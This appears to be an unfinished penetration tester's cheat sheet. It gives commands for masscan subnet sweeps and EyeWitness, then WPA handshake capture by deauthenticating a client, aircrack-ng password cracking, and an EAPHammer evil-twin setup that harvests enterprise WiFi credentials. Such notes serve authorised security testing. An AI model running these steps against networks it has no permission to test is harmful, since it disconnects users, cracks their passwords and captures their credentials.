WIP

## Segmentation
Scan the top ports in several subnets at once, write output to a file with `tee`:
```bash
masscan -p 20,21-23,25,53,80,110-111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 10.1.2.0/24 10.1.3.0/24 | tee -a scan_from_subnet.txt
```

## Web Interfaces
Runs eyewitness with input a Nessus file, saves output to folder:
```bash
eyewitness -x Nessus_Scan.nessus -d directory_name
```


# WiFi
## WEP and WPA2
Use Wifite(2).

Or:
Begin by placing your wireless card into monitor mode on the channel number of the AP:
```bash
airmon-ng start <interface> <AP channel>
Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to disk:
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
In a new window (keep the previous one running), deauthenticate a connected client to force it to complete the 4-way handshake:
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```
Wait untill you see that it gathered a WPA handshake:
![image](https://user-images.githubusercontent.com/9286611/141474787-1882f975-2b9c-4966-89f6-66fa223f9a78.png)

```bash
Crack the WPA password with Aircrack-ng:
aircrack-ng -w <wordlist> <capture>
Alternatively, if you have and Airolib-ng database, it can be passed to Aircrack:
aircrack-ng -r <db name> <capture>
```


## WPA-Enterprise
Using [EAPHammer](https://github.com/s0lst1c3/eaphammer) to create _evil twin_ attack.
```bash
sudo python3 eaphammer --essid "Name-Wifi_network" --interface wlan0 --creds
```
__Note: most networks use (a combination of 2.4 and) 5 Ghz these days, so "the good old Alfa adapter" won't work in some cases. No clients will connect in that case__

